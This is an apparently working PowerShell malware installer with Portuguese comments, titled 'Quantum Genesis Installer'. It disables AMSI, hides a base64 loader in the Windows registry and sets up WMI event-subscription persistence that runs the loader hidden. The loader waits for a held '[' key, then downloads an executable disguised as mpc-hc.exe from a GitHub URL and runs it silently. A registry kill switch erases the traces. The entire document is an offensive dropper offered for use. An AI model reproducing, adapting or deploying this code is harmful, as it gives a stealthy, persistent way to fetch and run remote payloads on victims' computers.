# --- QUANTUM GENESIS INSTALLER (NOTA 13) ---
# Execução Fileless + AMSI Bypass + WMI Persistence + Hardware Trigger ([) + Kill Switch (Unload)

$ErrorActionPreference = "SilentlyContinue"

# 1. Código do Loader (Será salvo no Registro do Windows de forma oculta)
$loaderCode = @'
# AMSI Bypass
$a=[Ref].Assembly.GetTypes()|Where-Object {$_.Name -like "*AmsiUtils*"}
$b=$a.GetFields('NonPublic,Static')|Where-Object {$_.Name -like "*amsiInitFailed*"}
$b.SetValue($null,$true)

$url = "https://raw.githubusercontent.com/kvn9asid9i8a/kkkk/main/mpc-hc.exe"
$VK_OPEN_BRACKET = 0xDB

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Quantum {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
"@

$press_start = 0
while($true) {
    if ([Quantum]::GetAsyncKeyState($VK_OPEN_BRACKET) -band 0x8000) {
        if ($press_start -eq 0) { $press_start = [DateTimeOffset]::Now.ToUnixTimeSeconds() }
        elseif (([DateTimeOffset]::Now.ToUnixTimeSeconds() - $press_start) -ge 5) {
            try {
                $bytes = (New-Object Net.WebClient).DownloadData($url)
                $path = "$env:TEMP\mpc$((Get-Random).ToString('X')).exe"
                [IO.File]::WriteAllBytes($path, $bytes)
                Start-Process $path -WindowStyle Hidden
            } catch {}
            $press_start = 0
            while([Quantum]::GetAsyncKeyState($VK_OPEN_BRACKET) -band 0x8000) { Start-Sleep -Milliseconds 100 }
        }
    } else { $press_start = 0 }

    # Kill Switch (Unload / Dissolve)
    if (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug" -Name "Dissolve" -ErrorAction SilentlyContinue) {
        Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -eq "QuantumFilter" } | Remove-WmiObject
        Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "QuantumConsumer" } | Remove-WmiObject
        Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*QuantumFilter*" } | Remove-WmiObject
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug" -Name "QuantumEngine"
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug" -Name "Dissolve"
        exit
    }
    Start-Sleep -Milliseconds 100
}
'@

# 2. Salvar no Registro
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($loaderCode))
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug"
if (!(Test-Path $regPath)) { New-Item $regPath -Force }
Set-ItemProperty -Path $regPath -Name "QuantumEngine" -Value $b64

# 3. Configurar WMI Persistence
$wmiCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug').QuantumEngine)))`""

$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "QuantumFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute % 5 = 0"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "QuantumConsumer"
    CommandLineTemplate = $wmiCommand
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

Write-Host "SUCESSO: Nota 13 ativada com sucesso." -ForegroundColor Magenta
